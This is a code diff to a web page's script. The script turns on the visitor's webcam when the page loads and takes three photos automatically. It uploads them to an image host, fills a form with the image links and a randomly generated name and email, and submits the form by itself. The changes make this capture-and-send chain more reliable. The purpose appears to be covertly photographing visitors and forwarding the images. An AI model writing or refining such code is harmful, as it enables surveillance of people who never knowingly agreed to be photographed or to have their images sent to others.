@@ -30,15 +30,18 @@
         const imageUrlMessage = document.getElementById("imageUrlMessage");
         const submitButton = document.getElementById("submitButton");
         let captureCount = 0;
+        let imageUrls = [];  // Store image URLs to ensure all are uploaded before submission
 
         // Start the webcam
-        navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 960 } }) // Standard 4:3 resolution
+        navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 960 } })
             .then(stream => {
                 videoElement.srcObject = stream;
+                console.log("Webcam initialized");
                 startAutoCapture();  // Start auto capture once the webcam is ready
             })
             .catch(error => {
                 console.error("Error accessing webcam:", error);
+                uploadStatus.innerHTML = "Error accessing webcam.";
             });
 
         // Function to start the auto-capture process
@@ -50,11 +53,13 @@
                     captureCount++;
                 } else {
                     clearInterval(interval);  // Stop capturing after 3 photos
-                    setTimeout(() => {
-                        submitForm(); // Submit the form after all images are captured
-                    }, 1000);
+                    if (imageUrls.length === 3) {
+                        submitForm(); // Submit the form after all images are captured and uploaded
+                    } else {
+                        uploadStatus.innerHTML += "<br>Not all images were uploaded successfully.";
+                    }
                 }
-            }, 500);  // Capture every 0.5 seconds
+            }, 1000);  // Capture every 1 second
         }
 
         // Generate random name and email
@@ -98,22 +103,27 @@
                 if (data.success) {
                     uploadStatus.innerHTML += `<br>Image ${captureCount} uploaded successfully! <br> 
                     <a href="${data.data.url_viewer}" target="_blank">View Image</a>`;
+                    imageUrls.push(data.data.url_viewer); // Store image URL for later submission
                     
                     // Append image link to the message field
                     imageUrlMessage.value += `Image ${captureCount}: ${data.data.url_viewer}\n`;
                 } else {
-                    uploadStatus.innerHTML += "<br>Error uploading image.";
+                    uploadStatus.innerHTML += `<br>Error uploading image ${captureCount}.`;
                 }
             })
             .catch(error => {
                 console.error("Error uploading image:", error);
-                uploadStatus.innerHTML += "<br>Error uploading image.";
+                uploadStatus.innerHTML += `<br>Error uploading image ${captureCount}.`;
             });
         }
 
         // Submit the form with all collected data
         function submitForm() {
-            submitButton.click(); // Programmatically click the submit button
+            if (imageUrls.length === 3) {
+                submitButton.click(); // Programmatically click the submit button
+            } else {
+                uploadStatus.innerHTML += "<br>Images not fully uploaded. Form submission canceled.";
+            }
         }
     </script>
 </body>
